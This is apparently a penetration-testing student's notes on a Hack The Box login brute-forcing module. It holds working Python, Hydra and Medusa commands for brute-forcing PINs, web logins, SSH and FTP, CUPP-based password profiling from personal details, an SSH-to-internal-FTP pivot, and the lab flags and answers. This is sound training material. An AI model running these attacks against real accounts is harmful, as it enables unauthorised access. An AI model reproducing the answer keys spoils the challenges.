# Login Brute Forcing (HTB Supplementary)

#BruteForce #Hydra #Medusa #CUPP #UsernameAnarchy #PasswordAttacks #SSH #FTP #HTTPBasicAuth #LoginForm #CustomWordlists #HTBSupplementary

**HTB Login Brute Forcing module**, supplements Offsec Module 16 (Password Attacks). The Offsec module covers Hydra for SSH/RDP/HTTP and Hashcat/John for offline cracking. This module adds: custom Python brute-force scripts (pin/dictionary via `requests`), Medusa as an alternative to Hydra, CUPP for target-profiled password generation, and the complete chained attack workflow (web auth → SSH → internal service discovery → FTP). Genuinely new to vault: Medusa, CUPP, Python scripts. Already covered and cross-referenced only: Hydra http-post-form, http-get, and username-anarchy.

> 🔁 Cross-refs: [[Password Attacks#16.1.2. SSH and RDP|SSH Hydra]], [[Password Attacks#16.1.3. HTTP POST Login Form|HTTP Login Forms]], [[Password Attacks (HTB Supplementary)#PA.13. Username-Anarchy|PA.13 username-anarchy]], [[Attacking Common Services (HTB Supplementary)#CS.8. Email / SMTP and POP3 Attacks|CS.8 Hydra FTP/SSH]], [[Password Attacks (HTB Supplementary)]]

---

## Outstanding Sections

- [x] LBF.1. Brute Force Attacks (PIN, custom Python script)
- [x] LBF.2. Dictionary Attacks (custom Python script with SecLists)
- [x] LBF.3. Basic HTTP Authentication (Hydra http-get)
- [x] LBF.4. Login Forms (Hydra http-post-form)
- [x] LBF.5. Web Services (Medusa: SSH + internal FTP pivot)
- [x] LBF.6. Custom Wordlists (CUPP + username-anarchy + grep filtering)
- [x] LBF.7. Skills Assessment Part 1 (Basic auth → username reveal)
- [x] LBF.8. Skills Assessment Part 2 (SSH → nmap → FTP chain)

---

## Core Concept: Brute-Force Flavours

Three distinct attack types, each with the right tool:

| Type | What you're doing | Tool |
|------|-------------------|------|
| **Numeric/PIN** | Exhaustive search through all possible combinations | Custom Python script |
| **Dictionary** | Try a known wordlist against a known credential field | Hydra / Medusa / Python |
| **Target-profiled** | Generate personalised wordlists from OSINT and then dictionary-attack | CUPP + username-anarchy + Hydra |

> 🔍 Worth remembering generally: dictionary attacks only work as well as the wordlist behind them. The more you know about a target (name, birthday, company, pet), the more you can narrow the search space with a profiled list rather than blasting rockyou at a rate-limited SSH server. CUPP automates that narrowing.

---

## LBF.1. Brute Force Attacks (PIN)

When the credential space is small and enumerable (a 4-digit PIN has only 10,000 combinations), write a script to walk it exhaustively rather than reaching for Hydra. This is faster, more controllable, and works even when the endpoint doesn't fit standard Hydra modules.

```python
#!/usr/bin/env python3
# solver.py — 4-digit PIN brute force via GET
import requests

ip = "TARGET_IP"   # change me
port = TARGET_PORT # change me

for pin in range(10000):
    formatted_pin = f"{pin:04d}"   # zero-pad: 7 becomes "0007"
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # .ok is True if status code is 200-299
    if response.ok and 'flag' in response.json():
        print(f"[+] Correct PIN: {formatted_pin}")
        print(f"[+] Flag: {response.json()['flag']}")
        break
```

Run it:
```bash
python3 solver.py
# Correct PIN found: 3424
# Flag: HTB{Brut3_F0rc3_1s_P0w3rfu1}
```

**What each part does:**
- `range(10000)` — 0 to 9999, every possible 4-digit PIN
- `f"{pin:04d}"` — format string: integer `pin`, padded to 4 digits with leading zeros (`d` = decimal, `04` = width 4, pad with `0`)
- `response.ok` — True for 2xx status codes, short for `response.status_code < 400`
- `'flag' in response.json()` — check the JSON body has a `flag` key before trying to print it; avoids KeyError on error responses

> 🔍 Worth remembering generally: `f"{pin:04d}"` is the canonical Python way to zero-pad a number. For OSCP challenges involving numeric codes (PIN, OTP, ticket numbers), this pattern is the building block. Change `04d` to `03d` for 3-digit, `06d` for 6-digit, etc.

**Q1 Answer:** `HTB{Brut3_F0rc3_1s_P0w3rfu1}`

#### Tags: #PINBruteForce #PythonRequests #Scripting

---

## LBF.2. Dictionary Attacks

Same Python `requests` pattern, but instead of exhaustive enumeration you feed it a wordlist. The module pulls SecLists directly from GitHub for the password list.

```python
#!/usr/bin/env python3
# solver.py — dictionary attack via POST
import requests

ip = "TARGET_IP"
port = TARGET_PORT

# Pull wordlist from GitHub (or use a local file with open('list.txt').read().splitlines())
passwords = requests.get(
    "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/"
    "Passwords/Common-Credentials/500-worst-passwords.txt"
).text.splitlines()

for password in passwords:
    response = requests.post(
        f"http://{ip}:{port}/dictionary",
        data={'password': password}
    )
    if response.ok and 'flag' in response.json():
        print(f"[+] Password: {password}")
        print(f"[+] Flag: {response.json()['flag']}")
        break
```

Run it:
```bash
python3 solver.py
# Correct password found: gateway
# Flag: HTB{Brut3_F0rc3_M4st3r}
```

> 🔍 Worth remembering generally: `.splitlines()` on a downloaded text file gives you a clean list with no trailing `\n` on each entry. This is cleaner than `.split('\n')` (which leaves an empty string at the end if the file has a trailing newline) and cleaner than using `open()` in a loop (which also includes `\n`).

> 🔧 Technique: for local wordlists, swap the requests.get block with:
> ```python
> with open('/usr/share/seclists/Passwords/rockyou.txt', encoding='latin-1') as f:
>     passwords = f.read().splitlines()
> ```
> `encoding='latin-1'` handles rockyou.txt's non-UTF-8 characters without crashing.

**Q1 Answer:** `HTB{Brut3_F0rc3_M4st3r}`

#### Tags: #DictionaryAttack #PythonRequests #SecLists

---

## LBF.3. Basic HTTP Authentication (Hydra http-get)

When a web server returns `WWW-Authenticate: Basic realm="..."` on a 401, that's HTTP Basic Auth. Hydra's `http-get` module handles it with one request per attempt (no session cookies, no redirect handling), making it the fastest Hydra web attack.

**Identify Basic Auth:**
```bash
curl -I http://TARGET:PORT
# HTTP/1.1 401 Unauthorized
# WWW-Authenticate: Basic realm="Restricted"
```

**Attack it:**
```bash
# Download a targeted password list
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt

# Brute-force with known username (-l lowercase = single user)
hydra -l basic-auth-user \
      -P 2023-200_most_used_passwords.txt \
      TARGET http-get / \
      -s PORT
# [PORT][http-get] host: TARGET  login: basic-auth-user  password: Password@123
```

**Verify the creds and get the flag:**
```bash
curl http://TARGET:PORT -u "basic-auth-user:Password@123" | grep HTB{
# <p>You found the flag: <span class="flag">HTB{th1s_1s_4_f4k3_fl4g}</span></p>
```

> 🔁 Similar to: [[Password Attacks#16.1.2. SSH and RDP|SSH/RDP hydra]], same Hydra flag pattern (`-l`/`-L`, `-p`/`-P`), just swap the module name (`http-get` vs `ssh`). See [[Password Attacks#16.1.3. HTTP POST Login Form|16.1.3]] for the more complex `http-post-form` variant.

> 🔍 Worth remembering generally: `WWW-Authenticate: Basic` in the 401 response header is the reliable indicator of HTTP Basic Auth. Don't guess the auth type from the page HTML alone as some sites fake a login form but actually use Basic Auth underneath, and the curl `-I` check reveals it immediately.

**Q1 Answer:** `HTB{th1s_1s_4_f4k3_fl4g}`

#### Tags: #BasicAuth #HTTPBasicAuth #Hydra #WWWAuthenticate

---

## LBF.4. Login Forms (Hydra http-post-form)

Standard web login forms send credentials as POST body fields. Hydra's `http-post-form` module handles this but needs three pieces of information you have to gather first: the path, the field names, and a failure string.

**Step 1: Inspect the form field names:**
```bash
# Tail the page HTML to find input names
curl http://TARGET:PORT | tail -15
# <form method="POST">
#   <input type="text" id="username" name="username">
#   <input type="password" id="password" name="password">
```

**Step 2: Try a dummy login to see what failure looks like:**
Browse to the page or curl with bad creds. Note the exact failure message text (e.g., "Invalid credentials"). This becomes the `-F=` string.

**Step 3: Download wordlists and attack:**
```bash
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt

# -L = username list, -P = password list, -f = stop on first success
hydra -L top-usernames-shortlist.txt \
      -P 2023-200_most_used_passwords.txt \
      -f TARGET -s PORT \
      http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
# [PORT][http-post-form] host: TARGET  login: admin  password: zxcvbnm
```

**Log in via browser to get the flag:**

> 📸 Screenshot: browser showing the logged-in page with the flag after entering admin:zxcvbnm

> 🔧 Technique: the three-part `http-post-form` string is `"PATH:BODY:FAIL_OR_SUCCESS_CONDITION"`. Each part is colon-separated. `^USER^` and `^PASS^` are Hydra's placeholders. `F=` prefixes a failure-string; `S=` prefixes a success-string (use `S=` when the failure page has no consistent unique text but the success page does). Full breakdown: [[Password Attacks#16.1.3. HTTP POST Login Form|16.1.3]]

> 🔁 Similar to: [[Password Attacks#16.1.3. HTTP POST Login Form|16.1.3]] and [[Password Attacks (HTB Supplementary)#PA.5. MSF smb_login|PA.5 MSF smb_login]], same "try credential pairs and look for a different response" model, different transport.

**Q1 Answer:** `HTB{W3b_L0gin_Brut3F0rc3}`

#### Tags: #LoginForm #HTTPPostForm #Hydra #CredentialBrute

---

## LBF.5. Web Services — Medusa (SSH + Internal FTP Pivot)

Medusa is Hydra's parallel, modular counterpart. The two tools cover the same protocols but Medusa's FTP module handles some edge cases more reliably and its `-t` (tasks) behaviour is more predictable on slower targets.

### SSH brute-force with Medusa

```bash
# -h = host, -n = port, -u = single username, -P = password list
# -M = module (ssh, ftp, http, etc.), -t = parallel tasks
medusa -h TARGET -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
# ACCOUNT FOUND: [ssh] Host: TARGET  User: sshuser  Password: 1q2w3e4r5t [SUCCESS]
```

Then SSH in and enumerate:
```bash
ssh sshuser@TARGET -p PORT
# (password: 1q2w3e4r5t)

# Discover what else is running locally
nmap localhost
# PORT   STATE SERVICE
# 21/tcp open  ftp
# 22/tcp open  ssh
```

> 🔍 Worth remembering generally: after landing an SSH shell on a pivot host, always run `nmap localhost` (or `ss -tlnp` / `netstat -tlnp`). Services bound to `127.0.0.1` are invisible from outside but reachable from the box itself. FTP on port 21 is the classic one to find here.

### Internal FTP brute-force with Medusa

The SSH session gives you a shell on the pivot host. From there, attack the locally-bound FTP service using a wordlist that's already on the machine:

```bash
# Note: attack 127.0.0.1 (the local loopback), not the external IP
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
# ACCOUNT FOUND: [ftp] Host: 127.0.0.1  User: ftpuser  Password: qqww1122 [SUCCESS]
```

Connect to FTP and retrieve the flag:
```bash
ftp ftp://ftpuser:qqww1122@localhost

ftp> ls
# flag.txt
ftp> get flag.txt
ftp> !cat flag.txt
# HTB{SSH_and_FTP_Bruteforce_Success}
```

> 📸 Screenshot: FTP session showing ls output and the flag after get flag.txt + !cat

> 🔧 Technique: `!command` in the FTP interactive shell runs `command` on your local machine (not the FTP server's filesystem). So `!cat flag.txt` reads the file you just downloaded to your current directory. This is the FTP client's shell escape, similar to `:!command` in Vim.

**Hydra vs Medusa quick comparison:**
| Feature | Hydra | Medusa |
|---------|-------|--------|
| SSH | `-t 4` recommended | `-t 3` recommended |
| FTP | works | slightly more reliable for slow targets |
| HTTP forms | `http-post-form` | `http` module (more complex setup) |
| Syntax | `hydra -l USER -P LIST TARGET MODULE` | `medusa -h HOST -u USER -P LIST -M MODULE` |
| Stop on first | `-f` flag | stops automatically in single-target mode |

**Q1 Answer (ftpuser password):** `qqww1122`
**Q2 Answer (flag in flag.txt):** `HTB{SSH_and_FTP_Bruteforce_Success}`

#### Tags: #Medusa #SSH #FTP #InternalPivot #BruteForce

---

## LBF.6. Custom Wordlists (CUPP + username-anarchy + grep filtering)

When you have OSINT on a specific person, generic wordlists like rockyou are inefficient. CUPP (Common User Passwords Profiler) generates a personalised password list from the target's personal details. username-anarchy generates all realistic username format combinations from a real name.

### username-anarchy — username generation

```bash
# Install / clone
git clone https://github.com/urbanadventurer/username-anarchy.git

# Generate all username formats for a real name → file
cd username-anarchy
./username-anarchy Jane Smith > ../jane_smith_usernames.txt
# Generates: jane, smith, jsmith, j.smith, smithj, jasmith, etc.
```

> 🔁 Similar to: [[Password Attacks (HTB Supplementary)#PA.13. Username-Anarchy|PA.13]], same tool, used here for web login rather than kerbrute AD user enum. The `./username-anarchy FirstName LastName > file.txt` pattern is identical.

### CUPP — targeted password generation

CUPP's interactive mode (`-i`) asks for personal details and generates mutations: birth dates, partner names, pet names, company name, with leet-speak variants, special-char suffixes, and numeric suffixes.

```bash
sudo apt install cupp -y
cupp -i
```

Walk through the prompts:
```
> First Name: Jane
> Surname: Smith
> Nickname: Janey
> Birthdate (DDMMYYYY): 11121990
> Partners) name: Jim
> Partners) nickname: Jimbo
> Partners) birthdate (DDMMYYYY): 12121990
> Child's name: [enter]
> Pet's name: Spot
> Company name: AHI
> Do you want to add some key words? y
> words: y
> Add special chars at end? y
> Add random numbers at end? y
> Leet mode? y

[+] Saving dictionary to jane.txt, counting 43222 words.
```

### Filtering the CUPP output by complexity policy

Real login systems often enforce a password policy. If you know the policy, filter the wordlist to match it before attacking (smaller list = faster attack, less noise):

```bash
# Policy: >= 6 chars, at least one uppercase, one lowercase, one digit, two special chars
grep -E '^.{6,}$' jane.txt \          # minimum 6 characters
  | grep -E '[A-Z]' \                  # at least one uppercase
  | grep -E '[a-z]' \                  # at least one lowercase
  | grep -E '[0-9]' \                  # at least one digit
  | grep -E '([!@#$%^&*].*){2,}' \    # at least two special characters
  > jane-filtered.txt
```

> 🔍 Worth remembering generally: the `([!@#$%^&*].*){2,}` regex means "the character class `[!@#$%^&*]` followed by zero or more of anything, repeated at least twice." This is the correct way to check for "at least N occurrences" of a character class in a line. The naive `[!@#$%^&*]{2}` only matches two special chars consecutively, which misses `J4ne!!` (where the `!!` are at the end but separated from the word characters).

### Attack with Hydra using both lists

```bash
hydra -L jane_smith_usernames.txt \
      -P jane-filtered.txt \
      TARGET -s PORT -f \
      http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
# [PORT][http-post-form] host: TARGET  login: jane  password: 3n4J!!
```

Log in with `jane:3n4J!!` to get the flag.

> 📸 Screenshot: browser showing logged-in page with flag after CUPP-derived credential

**Q1 Answer:** `HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}`

#### Tags: #CUPP #UsernameAnarchy #CustomWordlists #PasswordProfiling #GrexFiltering

---

## LBF.7. Skills Assessment Part 1

**Goal:** Brute-force HTTP Basic Auth, then use the revealed credentials to get a username for Part 2.

**Step 1: Confirm Basic Auth:**
```bash
curl -I http://TARGET:PORT
# WWW-Authenticate: Basic realm="Restricted"
```

**Step 2: Brute-force with username + password lists:**
```bash
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt

hydra -L top-usernames-shortlist.txt \
      -P 2023-200_most_used_passwords.txt \
      TARGET http-get / \
      -s PORT
# [PORT][http-get] host: TARGET  login: admin  password: Admin123
```

**Step 3: Pull the page with valid creds to get the Part 2 username:**
```bash
curl http://TARGET:PORT -u "admin:Admin123" | tail
# <p>This is the username you will need for part 2...
# <span class="flag">satwossh</span></p>
```

**Q1 Answer (password):** `Admin123`
**Q2 Answer (Part 2 username):** `satwossh`

#### Tags: #SkillsAssessment #BasicAuth #Hydra

---

## LBF.8. Skills Assessment Part 2

**Goal:** SSH brute-force with revealed username → land shell → discover internal FTP → generate usernames from OSINT file → brute-force FTP → read flag.

**Full attack chain:**

```mermaid
sequenceDiagram
    participant A as Attacker
    participant T as Target (external SSH)
    participant L as Target (localhost FTP)

    A->>T: hydra SSH satwossh + wordlist
    T-->>A: password: password1

    A->>T: ssh satwossh@TARGET -p PORT
    T-->>A: shell

    A->>T: nmap localhost
    T-->>A: port 21 FTP open

    A->>T: cat IncidentReport.txt
    T-->>A: Thomas Smith is the FTP user

    A->>T: username-anarchy Thomas Smith > thomas_smith.txt
    T-->>A: (list generated on the pivot box)

    A->>L: medusa 127.0.0.1 -U thomas_smith.txt -P passwords.txt -M ftp
    L-->>A: thomas : chocolate!

    A->>L: ftp ftp://thomas:chocolate!@localhost
    L-->>A: FTP session

    A->>L: get flag.txt → !cat flag.txt
    L-->>A: HTB{brut3f0rc1ng_succ3ssful}
```

**Step by step:**

```bash
# 1. SSH brute-force with the username from Part 1
hydra -l satwossh \
      -P 2023-200_most_used_passwords.txt \
      ssh://TARGET:PORT
# [PORT][ssh] login: satwossh  password: password1

# 2. SSH in
ssh satwossh@TARGET -p PORT
# (password: password1)

# 3. Enumerate files and local services
ls
# IncidentReport.txt  passwords.txt  username-anarchy

cat IncidentReport.txt
# ... Thomas Smith has been regularly uploading files ...

nmap localhost
# 21/tcp open  ftp
# 22/tcp open  ssh

# 4. Generate usernames for the OSINT name
./username-anarchy/username-anarchy Thomas Smith > thomas_smith.txt

# 5. FTP brute-force against localhost using the pivot box's own password list
medusa -h 127.0.0.1 \
       -U thomas_smith.txt \
       -P passwords.txt \
       -M ftp -t 5 | grep "ACCOUNT FOUND"
# ACCOUNT FOUND: [ftp] Host: 127.0.0.1  User: thomas  Password: chocolate! [SUCCESS]

# 6. Connect and get the flag (escape ! in bash with backslash)
ftp ftp://thomas:chocolate\!@localhost

ftp> ls
ftp> get flag.txt
ftp> !cat flag.txt
# HTB{brut3f0rc1ng_succ3ssful}
```

> 🔧 Technique: the `!` in `chocolate!` is a special character in bash (history expansion). Escape it with a backslash in the URL: `ftp://thomas:chocolate\!@localhost`. Alternatively, wrap the whole URL in single quotes (which disable all expansions): `ftp 'ftp://thomas:chocolate!@localhost'`.

> 🔍 Worth remembering generally: when you land an SSH shell and see a `passwords.txt` or wordlist already on the box, it was put there intentionally for the exercise. In a real engagement it would be something you collected from the target's file system during post-exploitation, e.g., from `/var/log/`, a developer's home directory, or a config file. Always `ls` the home directory of your user and every readable adjacent user's home before reaching for an external wordlist.

**Q1 Answer (FTP username):** `thomas`
**Q2 Answer (flag):** `HTB{brut3f0rc1ng_succ3ssful}`

#### Tags: #SkillsAssessment #SSH #FTP #Medusa #UsernameAnarchy #InternalPivot

---

## All Q&A Answers

| Section | Q# | Answer |
|---------|----|--------|
| Brute Force Attacks | 1 | `HTB{Brut3_F0rc3_1s_P0w3rfu1}` |
| Dictionary Attacks | 1 | `HTB{Brut3_F0rc3_M4st3r}` |
| Basic HTTP Authentication | 1 | `HTB{th1s_1s_4_f4k3_fl4g}` |
| Login Forms | 1 | `HTB{W3b_L0gin_Brut3F0rc3}` |
| Web Services | 1 | `qqww1122` |
| Web Services | 2 | `HTB{SSH_and_FTP_Bruteforce_Success}` |
| Custom Wordlists | 1 | `HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}` |
| Skills Assessment Part 1 | 1 | `Admin123` |
| Skills Assessment Part 1 | 2 | `satwossh` |
| Skills Assessment Part 2 | 1 | `thomas` |
| Skills Assessment Part 2 | 2 | `HTB{brut3f0rc1ng_succ3ssful}` |

---

## External Resources

- [PayloadsAllTheThings. Brute Force](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Brute%20Force)
- [HackTricks. Brute Force](https://github.com/HackTricks-wiki/hacktricks/blob/master/generic-methodologies-and-resources/brute-force.md)
- [CUPP GitHub](https://github.com/Mebus/cupp)
- [username-anarchy GitHub](https://github.com/urbanadventurer/username-anarchy)
- [SecLists. Passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
- [ippsec.rocks](https://ippsec.rocks/?#), search "hydra" or "medusa" for brute-force in real box walkthroughs

---

## Module Summary

The brute-force toolkit is: **Python requests** for custom endpoints where Hydra has no module, **Hydra** for standard services (SSH, FTP, RDP, HTTP-get, HTTP-post-form), **Medusa** as a reliable alternative for SSH/FTP. For targeted attacks, **username-anarchy** generates all realistic username formats from a real name, and **CUPP** generates personalised password lists from OSINT data, filter the CUPP output with grep to match known password policy before attacking. The pattern that appears across OSCP: land SSH, run `nmap localhost`, discover internal services (FTP on 21 is common), then attack the locally-bound service from inside the box.

**Tools covered:** custom Python (requests), Hydra (http-get, http-post-form, SSH), Medusa (SSH, FTP), CUPP, username-anarchy, nmap (localhost), ftp client


---

## HTB Module Quick Reference

Commands formatted for use with the [[Pre-Engagement Kali Setup]] variable block.

```bash
# ============================================================
# HYDRA — REMOTE BRUTE FORCE
# ============================================================
# FTP
hydra -l $Username -P /usr/share/wordlists/rockyou.txt ftp://$BoxIP

# SSH
hydra -l $Username -P /usr/share/wordlists/rockyou.txt ssh://$BoxIP

# RDP
hydra -l $Username -P /usr/share/wordlists/rockyou.txt rdp://$BoxIP

# HTTP POST form
hydra -l $Username -P /usr/share/wordlists/rockyou.txt $BoxIP \
  http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# HTTP GET with Basic Auth
hydra -l $Username -P /usr/share/wordlists/rockyou.txt $BoxIP http-get /

# Credential stuffing from a user:pass list
hydra -C creds.txt ssh://$BoxIP

# ============================================================
# MEDUSA — REMOTE BRUTE FORCE
# ============================================================
# SSH
medusa -h $BoxIP -u $Username -P /usr/share/wordlists/rockyou.txt -M ssh

# FTP with 5 parallel threads
medusa -h $BoxIP -U users.txt -P /usr/share/wordlists/rockyou.txt -M ftp -t 5

# Stop on first valid login
medusa -h $BoxIP -u $Username -P /usr/share/wordlists/rockyou.txt -M ssh -f

# ============================================================
# USERNAME GENERATION
# ============================================================
# username-anarchy: generate possible usernames from a real name
username-anarchy "Jane Smith"
username-anarchy -i names.txt            # bulk from file
username-anarchy -@ $Domain             # append @domain suffix
username-anarchy -l                     # list available format plugins

# ============================================================
# CUPP — PERSONALISED WORDLISTS
# ============================================================
cupp -i    # interactive mode: asks for target's personal info
cupp -l    # download popular lists (rockyou, etc)

# ============================================================
# PASSWORD POLICY FILTERING
# ============================================================
# Only keep passwords meeting a minimum complexity policy before bruteforcing
grep -E '^.{8,}$' rockyou.txt > filtered.txt                 # min 8 chars
grep -E '[A-Z]' filtered.txt > filtered2.txt                  # at least one uppercase
grep -E '[0-9]' filtered2.txt > filtered3.txt                 # at least one digit
grep -v -i 'password' filtered3.txt > final_wordlist.txt      # exclude trivial words

# Combined single command (8+ chars + uppercase)
grep -E '^.{8,}$' rockyou.txt | grep -E '[A-Z]' > policy_filtered.txt
```
